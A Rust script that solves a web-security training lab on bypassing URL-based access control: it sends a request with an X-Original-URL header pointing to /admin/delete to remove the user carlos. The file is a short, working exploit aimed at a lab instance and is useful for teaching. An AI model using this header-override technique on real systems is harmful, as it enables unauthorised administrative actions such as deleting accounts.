/****************************************************************
*
* Lab: URL-based access control can be circumvented
*
* Hack Steps: 
*      1. Add the X-Original-URL header to the request
*      2. Delete carlos from the admin panel
*
*****************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0abf005c03d17aad84b44f640038008e.web-security-academy.net";

fn main() {
    print!("❯❯ Deleting carlos with X-Original-URL header in the request.. ");
    io::stdout().flush().unwrap();

    let web_client = build_web_client();
    web_client
        .get(format!("{LAB_URL}?username=carlos"))
        .header("X-Original-Url", "/admin/delete")
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to delete carlos".red()));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
